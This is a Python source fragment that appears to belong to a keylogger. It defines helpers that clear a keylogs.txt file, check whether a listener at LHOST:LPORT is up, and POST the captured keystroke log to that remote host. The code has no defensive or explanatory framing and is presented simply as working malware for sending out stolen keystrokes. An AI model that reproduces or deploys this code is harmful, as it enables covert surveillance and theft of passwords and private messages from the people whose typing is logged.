import keyboard, time, os, re, requests
from datetime import datetime

# Function to clear the text file
def clear_file(KEYLOGS_FOLDER):
    f = open(KEYLOGS_FOLDER + '/keylogs.txt', 'r+')
    f.truncate(0)


# Function to check internet connection
def check_connection(LHOST, LPORT):
    try:
        requests.get("http://" + LHOST + ":" + LPORT, timeout=5)
        return True
    except requests.ConnectionError:
        return False

# Function to send the file to the server
def send_to_server(LHOST, LPORT, KEYLOGS_FOLDER):
    url = "http://" + LHOST + ":" + LPORT 

    with open(KEYLOGS_FOLDER + "/keylogs.txt", "r") as file:
        response = requests.post(url, files={'keylogs.txt': file.read()})

    if response.status_code == 200:
        return True
    return False
